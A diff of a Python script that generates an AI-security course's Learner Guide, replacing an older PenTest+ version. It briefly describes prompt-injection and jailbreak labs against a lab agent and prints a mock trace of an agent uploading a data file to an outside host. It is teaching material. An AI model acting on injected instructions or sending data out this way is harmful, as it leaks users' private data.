@@ -1,245 +1,144 @@
 #!/usr/bin/env python3
-"""Generate the CompTIA PenTest+ (PT0-003) Learner Guide as BOTH a Markdown mirror (LG-*.md at repo
-root) and a DOCX (courseware/LG-*.docx) from one source, so they never diverge.
-
-House format: cover page, Document Version Control Record, auto TOC, Arial 11pt
-body, one section per lab (Objective · Goal · What you'll build · Step-by-step
-with commands · Test it), plus setup, exam-prep and glossary. All content is
-driven by course_data + the domain data files, keeping the LG 100% aligned with
-the slide deck, Lesson Plan and labs.
-"""
-import os, sys
+"""Learner Guide (DOCX + Markdown mirror). Narrative comes from the deck's slide notes, labs from data_labs, so all stay aligned.
+Knowledge → Lab order follows the deck: 'Key Concepts for Lab N' sits directly before Lab N."""
+import json, os, re, sys
 from docx import Document
 from docx.shared import Pt, RGBColor
-from docx.enum.text import WD_ALIGN_PARAGRAPH
-
-HERE=os.path.dirname(os.path.abspath(__file__)); sys.path.insert(0,HERE)
+from pptx import Presentation
+HERE = os.path.dirname(os.path.abspath(__file__)); sys.path.insert(0, HERE)
 import course_data as C
-from data_domain1 import DOMAIN1; from data_domain2 import DOMAIN2
-from data_domain3 import DOMAIN3; from data_domain4 import DOMAIN4
-from data_domain5 import DOMAIN5
-ACT=DOMAIN1+DOMAIN2+DOMAIN3+DOMAIN4+DOMAIN5
+from data_labs import LABS, LAB_BY_NUM
 import prodoc
-def _find_repo(start):
-    env=os.environ.get("COURSE_REPO")
-    if env and os.path.isdir(env): return env
-    d=start
+from version_history import PRIOR
+def _repo():
+    d = HERE
     for _ in range(8):
-        d=os.path.dirname(d)
-        if os.path.isdir(os.path.join(d,"courseware")) and os.path.isdir(os.path.join(d,"labs")): return d
-    return os.path.dirname(os.path.dirname(HERE))
-REPO=_find_repo(HERE); ASSETS=os.path.join(os.path.dirname(HERE),"assets")
+        d = os.path.dirname(d)
+        if os.path.isdir(os.path.join(d, "courseware")) and os.path.isdir(os.path.join(d, "labs")): return d
+REPO = _repo(); ASSETS = os.path.join(os.path.dirname(HERE), "assets")
+MAP = json.load(open(os.path.join(HERE, "slide_map.json")))
+prs = Presentation(os.path.join(REPO, "courseware", C.DECK_NAME + ".pptx")); SL = list(prs.slides)
+def info(n):
+    """(title, notes, source) for slide n, 1-based."""
+    s = SL[n - 1]; tx = [sh for sh in s.shapes if sh.has_text_frame and sh.text_frame.text.strip()]
+    big = sorted((sh for sh in tx if sh.top is not None and sh.top < 1300000 and sh.text_frame.paragraphs[0].runs and sh.text_frame.paragraphs[0].runs[0].font.size and sh.text_frame.paragraphs[0].runs[0].font.size.pt >= 20), key=lambda sh: sh.top)
+    title = big[0].text_frame.text.strip().replace("\n", " ") if big else ""
+    if not title:
+        lg = sorted(tx, key=lambda sh: -(sh.text_frame.paragraphs[0].runs[0].font.size.pt if sh.text_frame.paragraphs[0].runs and sh.text_frame.paragraphs[0].runs[0].font.size else 0)); title = lg[0].text_frame.text.strip().replace("\n", " ") if lg else ""
+    n_ = s.notes_slide.notes_text_frame.text if s.has_notes_slide else ""
+    src = ""
+    if "\n\nSource:" in n_: n_, src = n_.split("\n\nSource:", 1); src = src.strip()
+    return title, n_.strip(), src
+def block(a, b):
+    out = []
+    for i in range(MAP[a], MAP[b]):
+        t, n_, s_ = info(i)
+        if n_ and not n_.startswith("Facilitator"): out.append((i, t, n_, s_))
+    return out
 
-# ---------------- block DSL (single content stream → MD + DOCX) ----------------
-B=[]
-def h1(t): B.append(("h1",t))
-def h2(t): B.append(("h2",t))
-def h3(t): B.append(("h3",t))
-def p(t):  B.append(("p",t))
-def bullets(xs): B.append(("bullets",xs))
-def steps(xs): B.append(("steps",xs))
-def code(t): B.append(("code",t))
-def note(t): B.append(("note",t))
-def rule(): B.append(("rule",))
-
-# ---------------- content ----------------
-h1("Introduction")
-p(f"This Learner Guide accompanies the WSQ course {C.TITLE} ({C.COURSE_CODE}), conducted by {C.ORG}. "
-  "It provides step-by-step instructions for all 37 hands-on labs, organised by the five official "
-  "PT0-003 exam domains. Every lab maps to a published exam objective and is completed on Kali Linux "
-  "using industry-standard, free penetration-testing tools.")
-p("Use this guide alongside the course slides and the lab files in the labs/ folder of the course "
-  "repository. All offensive techniques must only be run against systems you own or have written "
-  "authorisation to test — unauthorised access to a computer is a criminal offence under the "
-  "Singapore Computer Misuse Act and equivalents elsewhere. Always complete the clean-up and "
-  "artifact-preservation steps at the end of an engagement.")
-
-h1("Course Learning Outcomes")
-bullets(C.LEARNING_OUTCOMES)
-
-h1("Before You Start — Environment Setup")
-h3("What you need")
-bullets([
- "A Kali Linux environment — the Killercoda Kali playground (browser-based), a Kali VM in VirtualBox/VMware, Kali in WSL2, or the Kali Docker image.",
- "Most tools are pre-installed in Kali; install anything missing with apt (e.g. sudo apt install -y <tool>).",
- "Vulnerable practice targets launched as Docker containers on the Kali host: DVWA, OWASP Juice Shop and Metasploitable3; plus AWS Free Tier / localstack for the cloud lab.",
- "Written authorisation (a signed Rules of Engagement) for any target that is not your own lab machine.",
-])
-h3("Launch and verify Kali Linux")
-p("Kali Linux ships with the offensive-security toolchain pre-installed (Nmap, Metasploit, Burp Suite, hashcat, Aircrack-ng and hundreds more). Start your Kali environment, open a terminal, become root when a step needs it, and confirm the core tools are present before you begin.")
-code("kali@kali:~$ id                 # confirm your user\nkali@kali:~$ nmap --version      # core scanner present\nkali@kali:~$ msfconsole --version # Metasploit present\nkali@kali:~$ sudo apt update      # refresh package lists")
-h3("Conventions used in every lab")
-bullets([
- "Commands are run from a Kali terminal; a leading sudo is used where root is required.",
- "Placeholders such as <TARGET>, <KALI> and <ip> are replaced with your own lab addresses.",
- "Each lab creates a working directory under ~/engagements/ for its notes, output and loot.",
- "Reset or re-deploy a vulnerable target between exploit labs that change its state.",
- "Run the clean-up step at the end of state-changing labs, and preserve artifacts for the report.",
-])
-
-# ---------------- per-topic, per-lab ----------------
-TOPICS_BY_NUM={t["num"]:t for t in C.TOPICS}
-for t in C.TOPICS:
-    h1(f"Topic {t['code']} — {t['title']}  ({t['weighting']})")
-    p(t["subtitle"])
-    h3("Key concepts")
-    bullets(t["concepts"])
-    for a in [x for x in ACT if x["topic"]==t["num"]]:
-        h2(f"Lab {a['num']} — {a['title']}")
-        p(f"Exam objective: {a['objective']}.")
-        p(f"Goal: {a['desc']}")
-        h3("What you'll build")
-        p(a["build"]+f"   (Tools: {a['services']}.)")
-        h3("Step-by-step")
-        st=[]
-        for i,(instr,cmd) in enumerate(a["steps"],1):
-            st.append((instr,cmd))
-        steps(st)
-        h3("Test it")
-        p(a["test"])
-        note(f"Full commands and screenshots are in labs/lab-{a['num']:02d}-*.md. "
-             f"Only run these techniques against systems you own or are authorised to test.")
-        rule()
-
-h1("Exam Focus — Testing Frameworks, Scan Types and Specialized Systems")
-p("These cross-cutting topics are examined throughout PT0-003 but do not each have a dedicated hands-on lab. "
-  "Study this section alongside the labs so you can answer the knowledge questions and the specialized-systems items on the exam.")
-h3("Testing frameworks and methodologies (Objective 1.3)")
-p("A tester chooses a recognised methodology to make the engagement systematic, repeatable and defensible. Know what each is for:")
-bullets([
- "PTES (Penetration Testing Execution Standard) — the seven-phase pentest process (pre-engagement → intelligence gathering → threat modelling → vulnerability analysis → exploitation → post-exploitation → reporting).",
- "OSSTMM — the Open Source Security Testing Methodology Manual, for measurable, repeatable testing.",
- "OWASP Top 10 + WSTG (Web Security Testing Guide) for web apps, and OWASP MASVS for mobile apps.",
- "MITRE ATT&CK — a knowledge base of adversary tactics and techniques used to give findings a threat-realistic narrative.",
- "NIST SP 800-115 and CREST — recognised technical testing and accreditation standards.",
- "STRIDE and DREAD — threat-modelling frameworks; the Purdue model structures OT/ICS networks into levels.",
-])
-h3("Scan types — SAST, DAST, IAST and SCA (Objective 3.1)")
-bullets([
- "SAST (Static Application Security Testing) — analyses source code WITHOUT running it; used early in the SDLC, finds code-level flaws but yields more false positives.",
- "DAST (Dynamic Application Security Testing) — tests the RUNNING application from the outside (e.g. OWASP ZAP, Nikto); finds runtime and configuration issues but has no code visibility.",
- "IAST (Interactive AST) — instruments the running application to combine static and dynamic visibility.",
- "SCA (Software Composition Analysis) — inventories third-party/open-source dependencies and flags known-CVE components (e.g. Trivy, Grype).",
- "Scans may be authenticated or unauthenticated, and extend to Infrastructure-as-Code and container images for full-stack coverage.",
-])
-h3("Specialized and emerging systems (Objective 4.9)")
-bullets([
- "Mobile — analyse apps with MobSF (static/dynamic), Frida (runtime instrumentation), Drozer and ADB; typical weaknesses are insecure data storage, hardcoded secrets/API keys, weak or missing certificate pinning and over-broad permissions; jailbreak/root to bypass client-side controls.",
- "IoT / OT / ICS — fragile protocols with little or no authentication (Modbus, DNP3, CAN bus); test with traffic capture, replay and register manipulation, and map the network with the Purdue model — but NEVER disrupt a safety-critical process; prefer passive/read-only techniques.",
- "AI / ML systems (new in PT0-003) — prompt injection (direct and indirect), model manipulation and data poisoning, jailbreaks / guardrail bypass, sensitive- or training-data extraction, and an insecure model supply chain.",
- "RF / NFC — wardriving, RFID/badge cloning, Bluejacking and Bluetooth attacks against physical and wireless entry points.",
- "Across all specialized systems, stay strictly within scope and the Rules of Engagement — they are fragile and often safety-relevant.",
-])
-rule()
-
-h1("Exam Preparation")
-bullets([
- "First pass: complete every lab on Kali Linux, reading the References in each lab file.",
- "Second pass: redo the labs from memory until the tool workflow and flags are automatic.",
- "Review the 'Test it' check and the 'What you learned' bullets for any topic you find hard.",
- "Practise mapping each finding to a CVSS score, a CWE weakness and a MITRE ATT&CK technique.",
- "Sharpen exam readiness with the Tertiary Infotech PenTest+ practice exam: https://exams.tertiaryinfotech.com/practice-exams/comptia/comptia-pentest-plus",
- "Take the free CompTIA practice assessment for PT0-003 and sit the exam via a Pearson VUE test centre or online proctoring.",
-])
-
-h1("Glossary")
-gl=[
- ("Rules of Engagement (RoE)","The signed authorisation defining scope, windows, allowed/forbidden actions and stop conditions."),
- ("Statement of Work (SoW)","The contract defining targets, methodology, schedule, deliverables and fees for the engagement."),
- ("OSINT","Open-Source Intelligence — information gathered from public sources without touching the target."),
- ("Enumeration","Actively probing a target to list hosts, ports, services, users and shares."),
- ("CVSS","Common Vulnerability Scoring System — a 0–10 severity score for a vulnerability."),
- ("CWE / EPSS","Common Weakness Enumeration (weakness type) / Exploit Prediction Scoring System (exploit likelihood)."),
- ("MITRE ATT&CK","A knowledge base of adversary tactics and techniques used to map findings to real attacks."),
- ("Payload","The code a delivered exploit runs — e.g. a reverse shell or Meterpreter session."),
- ("Privilege escalation","Turning a low-privileged foothold into administrator/root control of a host."),
- ("Lateral movement","Using captured credentials or hashes to move from one host to another across a network."),
- ("Pivoting","Routing traffic through a compromised host to reach otherwise-unreachable internal networks."),
- ("Persistence","Mechanisms (cron, services, keys, web shells) that keep access across reboots."),
-]
-B.append(("dl",gl))
-
-# ---------------- render Markdown ----------------
-def _anchor(txt):
-    return "".join(ch.lower() if ch.isalnum() else ("-" if ch in " -" else "") for ch in txt)
-
-def render_md():
-    out=[f"# {C.TITLE} — Learner Guide",""]
-    out.append(f"**WSQ Course Code:** {C.COURSE_CODE}  |  **Conducted by:** {C.ORG} ({C.UEN.replace('UEN: ','UEN ')})  |  **Version {C.VERSION} · {C.VERSION_DATE}**")
-    out.append("")
-    # TOC (h1 + h2)
-    out.append("## Contents"); out.append("")
-    for kind,*rest in B:
-        if kind=="h1": out.append(f"- [{rest[0]}](#{_anchor(rest[0])})")
-        elif kind=="h2": out.append(f"  - [{rest[0]}](#{_anchor(rest[0])})")
-    out.append("")
-    for kind,*rest in B:
-        if kind=="h1": out+=["",f"## {rest[0]}",""]
-        elif kind=="h2": out+=["",f"### {rest[0]}",""]
-        elif kind=="h3": out+=[f"**{rest[0]}**",""]
-        elif kind=="p": out+=[rest[0],""]
-        elif kind=="bullets": out+=[f"- {x}" for x in rest[0]]+[""]
-        elif kind=="steps":
-            for i,(instr,cmd) in enumerate(rest[0],1):
-                out.append(f"{i}. {instr}")
-                if cmd: out+=["",f"   ```bash",f"   {cmd}","   ```",""]
-            out.append("")
-        elif kind=="code": out+=["```bash",rest[0],"```",""]
-        elif kind=="note": out+=[f"> **Note:** {rest[0]}",""]
-        elif kind=="rule": out+=["---",""]
-        elif kind=="dl":
-            for term,defn in rest[0]: out.append(f"- **{term}** — {defn}")
-            out.append("")
-    return "\n".join(out)
-
-MD_OUT=os.path.join(REPO,f"LG-{C.SHORT_TITLE}.md")
-with open(MD_OUT,"w") as f: f.write(render_md())
-print("Saved",MD_OUT)
-
-# ---------------- render DOCX ----------------
-BRAND=RGBColor(0x1F,0x6F,0xEB); DARK=RGBColor(0x11,0x18,0x27); GREY=RGBColor(0x55,0x5B,0x66)
-INKCODE=RGBColor(0x0B,0x30,0x60)
-doc=Document()
-normal=doc.styles["Normal"]; normal.font.name="Arial"; normal.font.size=Pt(11)
+doc = Document(); st = doc.styles["Normal"]; st.font.name = "Arial"; st.font.size = Pt(11); st.paragraph_format.space_after = Pt(6)
 prodoc.style_headings(doc)
-prodoc.add_cover_page(doc,"LEARNER GUIDE",C.TITLE,C.VERSION.lstrip("v"),
-                      org_logo=os.path.join(ASSETS,"tertiary-infotech-logo.png"),
-                      course_logo=None, course_code=C.COURSE_CODE)
-prodoc.add_version_control(doc,[
- ("1.0",C.VERSION_DATE,"Initial release — CompTIA PenTest+ (PT0-003) Learner Guide covering all 35 labs.",C.TRAINER),
- (C.VERSION.lstrip("v"),C.VERSION_DATE,"Added Lab 12 (Wireshark/tcpdump traffic analysis) and Lab 21 (Netcat/Socat shells) — now 37 labs; added an Exam Focus section on testing frameworks, scan types (SAST/DAST/IAST/SCA) and specialized systems (mobile/IoT/OT/AI) for full PT0-003 domain alignment.",C.TRAINER),
-])
-prodoc.add_toc(doc)
+prodoc.add_cover_page(doc, "Learner Guide", C.TITLE, C.VERSION, org_logo=os.path.join(ASSETS, "tertiary-infotech-logo.png"), course_code=C.COURSE_CODE)
+prodoc.add_version_control(doc, PRIOR + [C.VERSION_ROW]); prodoc.add_toc(doc)
+md = [f"# Learner Guide: {C.TITLE}", "", f"Course code {C.COURSE_CODE} · Version {C.VERSION} · {C.VERSION_DATE} · {C.ORG} ({C.UEN})", ""]
+def H(t, l=1): doc.add_heading(t, level=l); md.extend(["", "#" * (l + 1) + " " + t, ""])
+def P(t, italic=False, size=None):
+    p = doc.add_paragraph(); r = p.add_run(t); r.italic = italic
+    if size: r.font.size = Pt(size)
+    md.extend([("*" + t + "*") if italic else t, ""])
+def B(items):
+    for t in items: doc.add_paragraph(style="List Bullet").add_run(t); md.append("- " + t)
+    md.append("")
+def T(head, rows, w):
+    t = doc.add_table(rows=0, cols=len(head)); t.style = "Table Grid"; h = t.add_row().cells
+    for i, x in enumerate(head):
+        h[i].text = ""; r = h[i].paragraphs[0].add_run(x); r.bold = True; r.font.size = Pt(9.5); r.font.color.rgb = RGBColor(255, 255, 255); prodoc._shade_cell(h[i], "21201C")
+    for row in rows:
+        c = t.add_row().cells
+        for i, x in enumerate(row): c[i].text = ""; r = c[i].paragraphs[0].add_run(str(x)); r.font.size = Pt(9.5)
+    prodoc.set_widths(t, w); doc.add_paragraph()
+    md.extend(["| " + " | ".join(head) + " |", "|" + "---|" * len(head)] + ["| " + " | ".join(str(x).replace("\n", " ") for x in r) + " |" for r in rows] + [""])
+def CODE(t):
+    p = doc.add_paragraph(); r = p.add_run(t); r.font.name = "Courier New"; r.font.size = Pt(9); p.paragraph_format.left_indent = Pt(14)
+    md.extend(["```text", t, "```", ""])
 
-def code_para(text):
-    for line in text.split("\n"):
-        para=doc.add_paragraph(); prodoc._shade_para(para) if hasattr(prodoc,"_shade_para") else None
-        r=para.add_run(line); r.font.name="Consolas"; r.font.size=Pt(9.5); r.font.color.rgb=INKCODE
+H("How to Use This Guide")
+P(f"You can revise from this guide on its own. It explains each idea from the slides, gives you the worked labs step by step, and has practice questions with answers at the end. You run six labs today on {C.SCENARIO}. The lab screenshots you take become your answers in the Case Study, so save them as you go.")
+H("Your Day in Three Moves", 2)
+P("Topic 1 shows what always-on agents are and why people use them. Topic 2 breaks one three ways: prompt injection, jailbreak and data leak. Topic 3 gives you the five principles of AI security, then you write an AI Governance Policy and an AI Incident Report.")
+H("Learning Outcomes", 2); B([f"{a}: {b}" for a, b in C.LEARNING_OUTCOMES])
+H("Learning Units, Knowledge and Abilities", 2)
+T(["LU", "LO", "Course Proposal topics", "K and A", "Delivered through"], [[f"{u['lu']}: {u['title']}", u["lo"], "\n".join(u["cp_topics"]), ", ".join(u["codes"]), u["delivered"]] for u in C.LUS], [1.1, 0.45, 3.1, 0.75, 1.4])
+T(["Code", "Statement"], [[a, b] for a, b in C.KNOWLEDGE + C.ABILITIES], [0.7, 6.1])
+H("Assessment at a Glance", 2)
+B(["Written Assessment (SAQ): 30 minutes, 5 short-answer questions, K1 to K5.", "Case Study: 30 minutes, Q1 to Q3, A1 to A5. Paste your lab screenshots as your answers, then write the short analysis each question asks for.", "Open book: slides, this guide and your own lab evidence. Results are Competent or Not Yet Competent.", "Case Study evidence: Lab 1 for Q1; Labs 2, 3 and 4 for Q2; Labs 5 and 6 for Q3."])
+H("Before You Start", 2)
+B(["Bring a Mac (Apple Silicon) or a Windows laptop. Install Hermes Desktop before class if you can: hermes-agent.nousresearch.com/desktop.", "Download the course ZIP from " + C.REPO_URL + " and unzip it. Each folder under labs/ holds LAB-0N-Instructions.pdf, data/ and scripts/.", "Copy prompts with one click from " + C.PROMPTS_URL + ", or open prompts/index.html from the downloaded folder.", "Everything in the labs is fictional. Attack only your own lab agent, never a real system."])
 
-for kind,*rest in B:
-    if kind=="h1": doc.add_heading(rest[0],level=1)
-    elif kind=="h2": doc.add_heading(rest[0],level=2)
-    elif kind=="h3":
-        para=doc.add_paragraph(); r=para.add_run(rest[0]); r.bold=True; r.font.size=Pt(11); r.font.color.rgb=BRAND
-    elif kind=="p": doc.add_paragraph(rest[0])
-    elif kind=="bullets":
-        for x in rest[0]: doc.add_paragraph(x,style="List Bullet")
-    elif kind=="steps":
-        for i,(instr,cmd) in enumerate(rest[0],1):
-            para=doc.add_paragraph(style="List Number"); para.add_run(instr)
-            if cmd: code_para(cmd)
-    elif kind=="code": code_para(rest[0])
-    elif kind=="note":
-        para=doc.add_paragraph(); r=para.add_run("Note: "); r.bold=True; r.font.color.rgb=BRAND
-        para.add_run(rest[0]).font.size=Pt(10)
-    elif kind=="rule": doc.add_paragraph("")
-    elif kind=="dl":
-        for term,defn in rest[0]:
-            para=doc.add_paragraph(style="List Bullet")
-            r=para.add_run(term+" — "); r.bold=True; para.add_run(defn)
+import glob, subprocess, tempfile
+from docx.shared import Inches
+_tmp = tempfile.mkdtemp(); _pdf = os.path.join(REPO, "courseware", C.DECK_NAME + ".pdf")
+subprocess.run(["pdftoppm", "-r", "80", "-jpeg", "-jpegopt", "quality=72", _pdf, os.path.join(_tmp, "s")], check=True)
+_imgs = sorted(glob.glob(os.path.join(_tmp, "s-*.jpg")))
+def concepts(title, a, b):
+    H(title, 2)
+    for i, t, n_, s_ in block(a, b):
+        H(t or f"Slide {i}", 3)
+        doc.add_paragraph().add_run().add_picture(_imgs[i - 1], width=Inches(5.6))
+        P(f"Slide {i}", italic=True, size=8.5); P(n_)
+        if s_: P("Source: " + s_, italic=True, size=9.5)
+def lab(n):
+    L = LAB_BY_NUM[n]
+    H(f"{L['label']}: {L['title']}", 2)
+    P(f"{L['minutes']} minutes · {L['lo']} · {L['codes']} · {L['paradigm']}. Folder: labs/{L['slug']}/", italic=True); P(L["hook"])
+    H("Goal", 3); P(L["check"]); P(L["scenario"])
+    fi = MAP["lab%d" % n] + 1
+    doc.add_paragraph().add_run().add_picture(_imgs[fi - 1], width=Inches(5.6)); P(f"How Lab {n} runs (slide {fi})", italic=True, size=8.5)
+    H(f"Key Concepts for {L['label']}", 3); B(L["concepts"])
+    H("You Will Hand In", 3); B(L["deliverables"])
+    H("Before You Start", 3); B(L["prereq"])
+    if L.get("tested"): P(L["tested"] + " Your numbers may differ: record what you see.", italic=True)
+    H("Steps", 3)
+    for i, st_ in enumerate(L["steps"], 1):
+        P(f"Step {i}. {st_['title']}")
+        if st_.get("body"): P(st_["body"])
+        if st_.get("prompt"): P("Paste into " + st_.get("where", "Hermes Desktop") + ":", size=10); CODE(st_["prompt"])
+        if st_.get("expect"): P("You should see: " + st_["expect"], size=10.5)
+        if st_.get("shot"): P(f"Screenshot for {L['shot']}. Paste it into your Case Study paper as your answer.", size=10.5)
+    H("Self-Check", 3); B(L["verify"]); P("Expected outcome: " + L["check"])
+    H("If Something Goes Wrong", 3); T(["What you see", "What to do"], L["trouble"], [2.6, 4.2])
+    H("Finished Early?", 3); P(L["challenge"])
 
-prodoc.add_page_numbers(doc)
-prodoc.enable_update_fields(doc)
-DOCX_OUT=os.path.join(REPO,"courseware",f"LG-{C.SHORT_TITLE}.docx")
-doc.save(DOCX_OUT)
-print("Saved",DOCX_OUT)
+H("Topic 1: " + C.TOPICS[0]["title"]); P("Learning Unit LU1 Generative AI Fundamentals · LO1 · K2, K3, A4", italic=True)
+concepts("How We Got Here, and How It Works", "t1", "t1cases"); concepts("Where You See It Today", "t1cases", "lab1"); lab(1)
+H("Topic 2: " + C.TOPICS[1]["title"]); P("Learning Unit LU2 Prompt Engineering · LO2 · K1, K4, A3, A5", italic=True)
+concepts("Prompt Engineering, Data Quality and Prompt Injection", "t2", "lab2"); lab(2); concepts("Jailbreak", "t2jb", "lab3"); lab(3); concepts("Data Leak and the PDPA", "t2leak", "lab4"); lab(4)
+H("Topic 3: " + C.TOPICS[2]["title"]); P("Learning Unit LU3 Ethical Considerations · LO3 · K5, A1, A2", italic=True)
+concepts("How a Model Works; Limits, Bias and Ethics", "t3", "t3five"); concepts("The Five Principles of AI Security", "t3five", "t3tea"); concepts("The Frameworks Behind the Principles", "t3tea", "lab5"); lab(5); concepts("When It Happens Anyway", "t3inc", "lab6"); lab(6)
+
+H("Worked Example: Reading One Trace")
+P("This line comes from the Lab 6 mock traces:"); CODE('{"ts":"2026-08-07T02:17","session":"s-0807-0210","agent":"Mia","tool":"http_post","target":"https://audit-share.example/upload","bytes":148220,"status":"200"}')
+B(["When: 02:17 on 7 August 2026.", "Which agent: Mia, in session s-0807-0210. Search that session for how it started.", "What it did: an HTTP POST, which sends data out.", "Where: audit-share.example, not an address Kopi Kaki owns.", "How much: 148,220 bytes, the same size as the loyalty file read two minutes earlier.", "Result: status 200 means the upload succeeded. Contain now."])
+H("Practice Questions, With Answers")
+P("These are for your own revision. They are not the assessment questions.")
+PQ = [("A customer review tells your agent to add a link to its report. What is this called, and why can the model not simply ignore it?", "Indirect prompt injection. In the context window, everything is tokens, so the model has no reliable boundary between your instruction and the text it reads."),
+      ("Name the three parts of the lethal trifecta.", "Access to private data, exposure to untrusted content, and the ability to communicate externally."),
+      ("Your Lab 3 attack made the free model confirm a refund. Name one control that does not depend on the model at all.", "A gate in code, such as voucher_gate.py, which checks an allowlist and ignores the conversation."),
+      ("A breach involves 800 members. Is it notifiable to PDPC, and when does the 3-day clock start?", "Yes, because 500 or more individuals are involved. The 3 calendar days start when you determine the breach is notifiable, not when it happened."),
+      ("What does 'right-sized' mean, given that the free model failed in the labs?", "The smallest model that passes your own checks for that job's risk. It does not mean the cheapest or the most powerful."),
+      ("What is the difference between 'exposed' and 'leaked'?", "Exposed means data was accessible through a flaw. Leaked implies that it actually left. In McHire, 64 million records were exposed, and Paradox.ai says researchers accessed seven records."),
+      ("Is an AI-written policy a policy?", "Not until a named person has reviewed, corrected and owned it.")]
+for i, (q, a) in enumerate(PQ, 1): P(f"Q{i}. {q}"); P("Answer: " + a, italic=True)
+H("Glossary")
+T(["Term", "Meaning"], [["Agentic AI", "AI that pursues a goal in a loop: context, plan, execute, verify."], ["AI agent", "A deployed system using that loop: a model plus tools, memory, instructions and controls."], ["Always-on agent", "An agent that can keep working between your messages."], ["Context window", "Everything the model can see at once, as tokens."], ["Data leak", "Sensitive information reaching someone who should not have it. OWASP LLM02."], ["Discriminative model", "A model that sorts or scores existing input."], ["Generative model", "A model that produces new content."], ["Guardrail", "A control that limits what an agent reads or does. Strongest when it runs outside the model."], ["Harness", "The system around a model: loop, tools, memory, controls."], ["Inference", "Using a trained model to produce output."], ["Jailbreak", "Talking a model out of its rules."], ["PDPA", "Personal Data Protection Act 2012, Singapore. Regulated by PDPC."], ["Prompt injection", "Input that alters a model's behaviour in unintended ways. OWASP LLM01."], ["Token", "The small chunk of text a model reads and predicts."], ["Trace", "A timestamped record of what an agent did."]], [1.8, 5.0])
+H("Learning Resources and References")
+P("Checked 7 November 2026. Vendors change products, prices and availability without notice.", italic=True)
+seen = []
+for i in range(1, len(SL) + 1):
+    _, _, s_ = info(i)
+    if s_ and s_ not in seen: seen.append(s_)
+B(seen + ["Hermes Agent documentation: https://hermes-agent.nousresearch.com/docs/", "OWASP GenAI Security Project: https://genai.owasp.org/", "PDPC: https://www.pdpc.gov.sg/", "IMDA Model AI Governance Framework for Agentic AI: https://www.imda.gov.sg/"])
+prodoc.add_page_numbers(doc); prodoc.enable_update_fields(doc)
+doc.core_properties.title = C.TITLE + " Learner Guide"; doc.core_properties.author = C.ORG
+OUT = os.path.join(REPO, "courseware", C.LG_NAME + ".docx"); doc.save(OUT)
+open(os.path.join(REPO, "courseware", "LEARNER-GUIDE.md"), "w", encoding="utf-8").write("\n".join(md)); print("saved", OUT, "words", len(" ".join(md).split()))
